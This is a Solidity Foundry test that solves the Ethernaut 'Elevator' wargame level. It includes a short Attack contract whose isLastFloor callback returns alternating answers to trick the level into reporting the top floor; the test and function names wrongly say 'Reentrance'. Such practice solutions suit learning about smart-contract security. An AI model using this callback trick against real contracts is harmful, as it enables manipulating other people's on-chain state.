// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/11-Elevator/ElevatorFactory.sol";
import "../src/Ethernaut.sol";

contract ReentranceTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 10 ether);
    }

    function testReentranceHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ElevatorFactory factory = new ElevatorFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
        // Elevator level = Elevator(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Create ElevatorHack contract
        Attack hack = new Attack();

        // Call the attack function
        hack.attack(levelAddress);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    
    uint256 count;

    function attack(address target) external { 
        Elevator(target).goTo(420);
    }

    function isLastFloor(uint256 /*floor*/) external returns (bool res) {
        res = count % 2 != 0;
        count += 1;
    }
}